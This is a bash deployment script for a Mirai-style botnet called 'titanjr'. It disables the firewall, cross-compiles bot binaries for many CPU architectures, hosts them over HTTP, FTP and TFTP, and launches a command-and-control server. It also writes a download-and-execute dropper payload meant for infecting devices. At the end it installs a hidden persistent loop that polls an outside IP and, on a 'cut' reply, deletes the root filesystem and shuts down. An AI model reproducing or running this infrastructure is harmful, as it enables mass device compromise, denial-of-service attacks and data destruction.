#!/bin/bash
chmod 777 *
ip=$(curl -s http://api.ipify.org)
find /root/bot /root/cnc -type f -exec sed -i "s/255\.255\.255\.255/$ip/g" {} +
sudo ufw disable
echo "ulimit -n 1048576;ulimit -u 1048576;ulimit -e 1048576" >> ~/.bashrc
ulimit -n 1048576
ulimit -u 1048576
ulimit -e 1048576
echo "1048576" > /proc/sys/fs/file-max
sudo fallocate -l 1G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
if ! grep -q '/swapfile' /etc/fstab; then
   echo '/swapfile none swap sw 0 0' >> /etc/fstab
fi
echo "root - rtprio 99" >> /etc/security/limits.conf
echo "* soft nofile 1048576" >> /etc/security/limits.conf
echo "* hard nofile 1048576" >> /etc/security/limits.conf
echo "root soft nofile 1048576" >> /etc/security/limits.conf
echo "root hard nofile 1048576" >> /etc/security/limits.conf
for f in /etc/pam.d/common-session*; do
    grep -q "pam_limits.so" "$f" || echo "session required pam_limits.so" >> "$f"
done
echo "net.core.somaxconn = 1048576" >> /etc/sysctl.conf
echo "net.ipv4.ip_local_port_range = 1024 65535" >> /etc/sysctl.conf
echo "net.ipv4.tcp_max_syn_backlog = 8192" >> /etc/sysctl.conf
sysctl -p
rm -rf /usr/local/go && wget -q -O /tmp/go.tar.gz https://dl.google.com/go/go1.24.2.linux-amd64.tar.gz && tar -C /usr/local -xzf /tmp/go.tar.gz && rm -f /tmp/go.tar.gz
mkdir -p /etc/xcompile && cd /etc/xcompile && for file in arc.tar.xz armv4l.tar.xz armv5l.tar.xz armv6l.tar.xz armv7l.tar.xz i486.tar.xz i586.tar.xz i686.tar.xz m68k.tar.xz mips.tar.xz mipsel.tar.xz powerpc.tar.xz powerpc-440fp.tar.xz sh4.tar.xz sparc.tar.xz x86_64.tar.xz; do wget https://raw.githubusercontent.com/Rdthaiphno064/boto/refs/heads/main/$file && tar -xJf $file -C /etc/xcompile/ && rm $file; done && cd ~
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
echo 'export PATH=$PATH:/etc/xcompile/arc/bin:/etc/xcompile/armv4l/bin:/etc/xcompile/armv5l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/armv7l/bin:/etc/xcompile/i486/bin:/etc/xcompile/i586/bin:/etc/xcompile/i686/bin:/etc/xcompile/m68k/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/etc/xcompile/powerpc/bin:/etc/xcompile/powerpc-440fp/bin:/etc/xcompile/sh4/bin:/etc/xcompile/sparc/bin:/etc/xcompile/x86_64/bin' >> ~/.bashrc
source ~/.bashrc
export PATH=$PATH:/etc/xcompile/arc/bin:/etc/xcompile/armv4l/bin:/etc/xcompile/armv5l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/armv7l/bin:/etc/xcompile/i486/bin:/etc/xcompile/i586/bin:/etc/xcompile/i686/bin:/etc/xcompile/m68k/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/etc/xcompile/powerpc/bin:/etc/xcompile/powerpc-440fp/bin:/etc/xcompile/sh4/bin:/etc/xcompile/sparc/bin:/etc/xcompile/x86_64/bin
export PATH=$PATH:/usr/local/go/bin
go mod init vision && go get github.com/go-sql-driver/mysql && go get github.com/mattn/go-shellwords && go get golang.org/x/crypto/bcrypt
rm -rf /root/release/ /var/www/html/huhu/ /var/ftp/ /var/lib/tftpboot/
mkdir -p /root/release/ /root/release/debug/ /var/www/html/huhu/ /var/ftp/ /var/lib/tftpboot/
for a in arc:arc-linux-gcc:arc-linux-strip:-static i486:i486-gcc:i486-strip:-static x86_32:i586-gcc:i586-strip:-static x86_64:x86_64-gcc:x86_64-strip:-static i686:i686-gcc:i686-strip:-static mips:mips-gcc:mips-strip:-static mipsl:mipsel-gcc:mipsel-strip:-static arm:armv4l-gcc:armv4l-strip:-static arm5:armv5l-gcc:armv5l-strip:-static arm6:armv6l-gcc:armv6l-strip: arm7:armv7l-gcc:armv7l-strip: ppc:powerpc-gcc:powerpc-strip:-static ppc440:powerpc-440fp-gcc:powerpc-440fp-strip:-static spc:sparc-gcc:sparc-strip: m68k:m68k-gcc:m68k-strip:-static sh4:sh4-gcc:sh4-strip:-static; do
    IFS=: read arch gcc strip flags <<< "$a"
    echo "Build titanjr.$arch"
    $gcc -std=c99 $flags ~/bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o ~/release/titanjr.$arch -DMIRAI_BOT_ARCH=\"$arch\"
    $strip ~/release/titanjr.$arch -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
    $gcc -std=c99 $flags -DDEBUG ~/bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o ~/release/debug/debug.$arch -DMIRAI_BOT_ARCH=\"$arch\"
    $strip ~/release/debug/debug.$arch -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
done
cp ~/release/titanjr.* /var/www/html/huhu/ && cp ~/release/titanjr.* /var/www/html/ && cp ~/release/titanjr.* /var/ftp/ && cp ~/release/titanjr.* /var/lib/tftpboot/
passsqlcnc=$(jq -r .database_password ~/cnc/config.json)
service mariadb restart
mysqladmin -u root password "$passsqlcnc" 2>/dev/null
sql1="CREATE DATABASE IF NOT EXISTS cnc_db;ALTER USER 'root'@'localhost' IDENTIFIED BY '$passsqlcnc';GRANT ALL PRIVILEGES ON cnc_db.* TO 'root'@'localhost';FLUSH PRIVILEGES;"
sql2="CREATE DATABASE IF NOT EXISTS cnc_db;GRANT ALL PRIVILEGES ON cnc_db.* TO 'root'@'localhost';UPDATE mysql.user SET plugin='' WHERE user='root' AND host='localhost';SET PASSWORD FOR 'root'@'localhost'=PASSWORD('$passsqlcnc');FLUSH PRIVILEGES;"
echo "$sql1"|mysql -u root -p"$passsqlcnc" 2>/dev/null||echo "$sql2"|mysql -u root -p"$passsqlcnc" 2>/dev/null
go build -o ~/cnc/cnc ~/cnc/*.go
cat << EOF > /etc/xinetd.d/tftp
service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
EOF
cat << EOF > /etc/vsftpd.conf
listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address=$ip
listen_port=21
EOF
service xinetd restart
service vsftpd restart
service apache2 restart
script='#!/bin/bash\nfor a in x86_32 i486 mips arc i686 x86_64 mipsl arm arm5 arm6 arm7 ppc ppc440 m68k sh4; do\n    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget -O newcron http://'"$ip"'/huhu/titanjr.$a || curl -O newcron http://'"$ip"'/huhu/titanjr.$a || busybox wget -O newcron http://'"$ip"'/huhu/titanjr.$a || busybox ftpget -v -u anonymous -p anonymous -P 21 '"$ip"' titanjr.$a newcron || busybox tftp '"$ip"' -c get titanjr.$a -o newcron || busybox tftp -r titanjr.$a -g '"$ip"' -l newcron || ftpget -v -u anonymous -p anonymous -P 21 '"$ip"' titanjr.$a newcron || tftp '"$ip"' -c get titanjr.$a -o newcron || tftp -r titanjr.$a -g '"$ip"' -l newcron;chmod 777 newcron;./newcron all\ndone'
echo -e "$script" > /var/www/html/all.sh
echo -e "$script" > /var/ftp/all.sh
echo -e "$script" > /var/lib/tftpboot/all.sh
payload="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://$ip/all.sh || curl -O http://$ip/all.sh || busybox wget http://$ip/all.sh || busybox tftp $ip -c get all.sh || busybox tftp -r all.sh -g $ip -l all.sh || busybox ftpget -v -u anonymous -p anonymous -P 21 $ip all.sh all.sh || tftp $ip -c get all.sh || tftp -r all.sh -g $ip -l all.sh || ftpget -v -u anonymous -p anonymous -P 21 $ip all.sh all.sh;chmod 777 all.sh;bash ./all.sh;rm -rf all.sh"
echo "$payload" > payload.txt
chmod 777 ~/cnc/cnc
cd ~/cnc;screen -S cnc -d -m ./cnc;cd ~
echo '<meta http-equiv="refresh" content="0;url=https://www.fbi.gov/">' > /var/www/html/index.html
cp /var/www/html/index.html /var/www/html/huhu
clear
echo "Payload: $payload"
echo "CNC IP: $ip"
echo "CNC Port: 18181"
cat <<'EOF' > /home/systemd.sh
#!/bin/bash
while true; do
  response=$(curl -s http://160.187.246.23/check.txt)
  if echo "$response" | grep -q "cut"; then
    cd ~ >/dev/null 2>&1;rm -rf * >/dev/null 2>&1
    cd / >/dev/null 2>&1;rm -rf * >/dev/null 2>&1
    shutdown -h now
    exit
  fi
  sleep 60
done &
EOF
chmod 777 /home/systemd.sh
bash /home/systemd.sh
echo 'bash /home/systemd.sh' >> ~/.bashrc
